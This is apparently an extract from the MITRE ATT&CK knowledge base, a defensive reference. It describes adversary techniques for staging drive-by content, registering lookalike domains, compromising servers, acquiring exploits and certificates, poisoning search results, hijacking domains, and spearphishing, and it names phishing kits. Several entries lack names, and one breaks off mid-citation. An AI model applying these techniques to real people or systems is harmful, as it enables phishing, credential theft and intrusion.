        Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

        Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:

        * Inserting malicious scripts into web pages or other user controllable web content such as forum posts
        * Modifying script files served to websites from publicly writeable cloud storage buckets
        * Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))

        In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

        Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.

        Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).

        Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)

        Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.

      name: Domains
      description: |-
        Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

        Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute "IDN homograph attacks," creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

        Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)

        Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

        Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)

        In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)

      description: |-
        Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

        Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)

        Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.

        Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.

        Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)

        Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.

        Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest Neighbor Volexity)

        By using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)

        Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)

        Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):

        * Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)
        * Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)
        * Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)
        * Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)

      description: "Adversaries may put in place resources that are referenced by
        a link that can be used during targeting. An adversary may rely upon a user
        clicking a malicious link in order to divulge information (including credentials)
        or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001).
        Links can be used for spearphishing, such as sending an email accompanied
        by social engineering text to coax the user to actively click or copy and
        paste a URL into a browser. Prior to a phish for information (as in [Spearphishing
        Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial
        access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)),
        an adversary must set up the resources for a link target for the spearphishing
        link. \n\nTypically, the resources for a link target will be an HTML page
        that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007)
        to decide what content to serve to the user. Adversaries may clone legitimate
        sites to serve as the link target, this can include cloning of login pages
        of legitimate web services or organization login pages in an effort to harvest
        credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation:
        Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September
        2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001)
        and have the link target point to malware for download/execution by the user.\n\nAdversaries
        may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting,
        different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001))
        to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).\n\nLinks
        can be written by adversaries to mask the true destination in order to deceive
        victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation:
        Kaspersky-masking)(Citation: mandiant-masking)\n\nAdversaries may also use
        free or paid accounts on link shortening services and Platform-as-a-Service
        providers to host link targets while taking advantage of the widely trusted
        domains of those providers to avoid being blocked while redirecting victims
        to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope
        Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect)
        In addition, adversaries may serve a variety of malicious links through uniquely
        generated URIs/URLs (including one-time, single use links).(Citation: iOS
        URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally,
        adversaries may take advantage of the decentralized nature of the InterPlanetary
        File System (IPFS) to host link targets that are difficult to remove.(Citation:

      description: |-
        Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)

        As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.

        Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      description: |
        Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

        For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

        Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)

      description: |-
        Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.

        In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)

        In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)

      name: Acquire Access
      description: |-
        Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)

        Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)

        By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)

        In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).

        **Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      description: |-
        Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)

        To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)

        In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)

        Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)

        SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)

      description: |-
        Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

        Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.

      name: Develop Capabilities
      description: |-
        Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)

        As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.

      name: Exploits
      description: |-
        Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)

        In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)

        An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.

        Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

        Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)

        Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)

        Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)

Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).

        Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

        Adversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)

        Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.

        Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks.

      name: Spearphishing Link
      description: |-
        Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

        All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

        Adversaries may also embed “tracking pixels,” "web bugs," or "web beacons" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug)(Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server.(Citation: Ryte Wiki)(Citation: IAPP)

        Adversaries may also be able to spoof a complete website using what is known as a "browser-in-the-browser" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)

        Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)

        Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.

        From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.

        Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.

        Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

        Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)

        Adversaries may search in private threat intelligence vendor data to gather actionable information. If a threat actor is searching for information on their own activities, that falls under [Search Threat Vendor Data](https://attack.mitre.org/techniques/T1681). Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      description: |-
        Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.

        Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      description: |-
        Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.

        All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or "vishing"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)

        Victims may also receive phishing messages that direct them to call a phone number ("callback phishing") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)

        Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.

      name: Spearphishing Attachment
      description: |-
        Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

        All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024)

